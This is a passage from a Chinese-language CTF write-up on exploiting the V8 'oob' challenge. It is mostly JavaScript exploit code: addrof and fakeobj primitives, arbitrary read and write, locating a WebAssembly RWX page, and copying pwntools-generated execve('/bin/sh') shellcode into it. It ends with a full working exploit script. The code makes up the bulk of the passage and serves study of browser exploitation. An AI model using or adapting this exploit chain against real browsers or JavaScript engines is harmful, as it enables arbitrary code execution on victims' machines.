
```text
E+0x00 ┃ FixedDoubleArray 的 map ┃ ┐
E+0x08 ┃ length = 4 ┃ ┘ buffer 头，共 0x10
E+0x10 ┃ element[0] = float_arr_map ┃ ← fake 必须从这一行开始
E+0x18 ┃ element[1] = 1.2 ┃
E+0x20 ┃ element[2] = 1.3 ┃ 数据区，4 × 8 = 0x20
E+0x28 ┃ element[3] = 1.4 ┃
E+0x30 ┃ ───────── buffer 结束 ─────────┃
A+0x00 ┃ JSArray.map ┃ ← A = E + 0x30
A+0x08 ┃ properties ┃
A+0x10 ┃ elements → E ┃
A+0x18 ┃ length = 4 ┃
```

等于是 `arb_rw_arr` 的元素区被借出来塞进fake对象

### WASM

用wasm申请一个RWX页

这里可以用用 `wat2wasm`、`wasm2wat`

```javascript
var wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
```

这里复用一下之前的wasm，含义大致是导出一块 Wasm Linear Memory

`main()` 函数返回 42

```javascript
var wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);
```

编译`mod`，实例化，导出`main`函数，`read rwx_page_addr`

这里的`0x88`得`gdb`看一下

<!-- 这是一张图片，ocr 内容为： -->

![图片描述](upload/attach/202609/1075564_CVCP68MBXUBRA7W.webp)

`wasm_instance = 0x2421fb1a0d31`

<!-- 这是一张图片，ocr 内容为： -->

![图片描述](upload/attach/202609/1075564_X969VFQ9WARPTP9.webp)

<!-- 这是一张图片，ocr 内容为： -->

![图片描述](upload/attach/202609/1075564_YUS8YU3NG3KVCDP.webp)

<!-- 这是一张图片，ocr 内容为： -->

![图片描述](upload/attach/202609/1075564_ZS42TE9FFPYMYMP.webp)

`gdb`就是好用啊

#### `copy_shellcode`

```javascript
function copy_shellcode(addr,shellcode){
let abuf = new ArrayBuffer(0x100);
let dataview = new DataView(abuf);
let backing_store_addr = addrof(abuf) + 0x20n;
initial_arb_write(backing_store_addr,addr);
for(let i = 0;i < shellcode.length;i++){
dataview.setUint32(4*i,shellcode[i],true);
}
}
```

`0x20`是backing store 的offset

`dataview.setUint32(4*i,shellcode[i],true);`，32位小端序写入

这里用 `pwntools` 生成一下shellcode

```python
from pwn import *
context.clear(arch='amd64')
context.log_level = 'error'
sc = asm("""
lea rdi, [rip + sh]
xor esi, esi
xor edx, edx
mov eax, 59
syscall
sh:
.asciz "/bin/sh"
""")
sc = sc.ljust((len(sc) + 3) // 4 * 4, b'\x90')
print("// %d bytes" % len(sc))
print("var shellcode = [")
words = ["0x" + sc[i:i+4][::-1].hex() for i in range(0, len(sc), 4)]
for i in range(0, len(words), 6):
print(" " + ", ".join(words[i:i+6]) + ",")
print("];")
print(disasm(sc))
```

<!-- 这是一张图片，ocr 内容为： -->

![图片描述](upload/attach/202609/1075564_T25KKB6CKFZRA4D.webp)

```javascript
var shellcode = [
0x0b3d8d48, 0x31000000, 0xb8d231f6, 0x0000003b, 0x622f050f, 0x732f6e69,
0x90900068,
];
```

### exp

```javascript
var buf = new ArrayBuffer(8)
var f64_buf = new Float64Array(buf)
var u32_buf = new Uint32Array(buf)
function ftoi(val){ // float to BigInt
f64_buf[0] = val;
return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
function itof(val){ // BigInt to float
u32_buf[0] = Number(val & 0xffffffffn);
u32_buf[1] = Number(val >> 32n);
return f64_buf[0];
}
var obj = {"A": 1};
var obj_arr = [obj];
var float_arr = [1.1,1.2,1.3,1.4];
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();
function addrof(in_obj){
obj_arr[0] = in_obj;
obj_arr.oob(float_arr_map);
let addr = obj_arr[0];
obj_arr.oob(obj_arr_map);
return ftoi(addr);
}
function fakeobj(addr){
float_arr[0] = itof(addr);
float_arr.oob(obj_arr_map);
let fake = float_arr[0];
float_arr.oob(float_arr_map);
return fake;
}
var arb_rw_arr = [float_arr_map,1.2,1.3,1.4];
//这里的float_arr_map是double值
function arb_read(addr){
if (addr%2n == 0) addr += 1n;
let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
return ftoi(fake[0]);
}
function initial_arb_write(addr,val){
let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
fake[0] = itof(BigInt(val));
}
var wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);
function copy_shellcode(addr,shellcode){
let abuf = new ArrayBuffer(0x100);
let dataview = new DataView(abuf);
let backing_store_addr = addrof(abuf) + 0x20n;
initial_arb_write(backing_store_addr,addr);
for(let i = 0;i < shellcode.length;i++){
dataview.setUint32(4*i,shellcode[i],true);
}
}
var shellcode = [
0x0b3d8d48, 0x31000000, 0xb8d231f6, 0x0000003b, 0x622f050f, 0x732f6e69,
0x90900068,
];
copy_shellcode(rwx_page_addr, shellcode);
f();
```

<!-- 这是一张图片，ocr 内容为： -->

![图片描述](upload/attach/202609/1075564_RJB2H83DTP72EA8.webp)

终于出了

## 参考文献

- 从 0 开始学 V8 漏洞利用之环境搭建（一）

<<mark class="encrypted">4aeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8r3!0#2k6q4)9J5k6i4c8W2L8X3y4W2L8Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3x3e0V1@1y4e0M7$3y4l9`.`.</mark>>

- 从 0 开始学 V8 漏洞利用之 V8 通用利用链（二）

<<mark class="encrypted">1a2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8r3!0#2k6q4)9J5k6i4c8W2L8X3y4W2L8Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3x3e0V1@1y4e0M7$3y4R3`.`.</mark>>

- 从 0 开始学 V8 漏洞利用之 V8 通用利用链（三）

<<mark class="encrypted">a4cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8r3!0#2k6q4)9J5k6i4c8W2L8X3y4W2L8Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3x3e0V1@1y4e0M7$3y4H3`.`.</mark>>

- Seebug 漏洞平台

<<mark class="encrypted">9a4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8r3!0#2k6q4)9J5k6i4c8W2L8X3y4W2L8Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3V1k6U0L8$3I4#2L8h3&6Q4x3V1j5J5x3e0V1#2</mark>>

- <<mark class="encrypted">0a7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3N6Y4g2D9M7#2)9J5c8U0t1H3x3K6M7J5x3g2)9J5k6h3S2@1L8h3H3`.</mark>>

- 这个讲 starctf oob 质量也挺好

<<mark class="encrypted">529K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3j5i4u0S2P5W2)9J5k6h3k6S2K9i4c8Z5i4K6u0r3x3U0l9I4z5g2)9J5k6o6p5J5i4K6u0V1x3e0y4Q4x3X3c8K6N6r3q4J5j5%4c8X3i4K6u0V1L8$3!0T1i4K6u0V1N6U0S2Q4x3X3c8A6L8X3c8W2M7s2c8Z5i4K6u0r3</mark>>

- V8 入门，好文章

<<mark class="encrypted">c64K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1L8$3E0S2L8h3g2A6L8X3g2Q4x3X3g2Y4K9i4c8T1L8$3!0C8i4K6u0W2K9h3!0Q4x3V1k6U0K9r3!0K6k6g2)9J5k6r3#2W2i4K6u0V1L8%4u0Q4x3X3c8B7j5i4k6S2M7$3y4J5K9i4m8@1i4K6u0V1N6U0R3`.</mark>>

<!-- 这是一张图片，ocr 内容为： -->

![图片描述](upload/attach/202609/1075564_TESFVG5YQBZX6UN.webp)

本文首发于我的个人博客
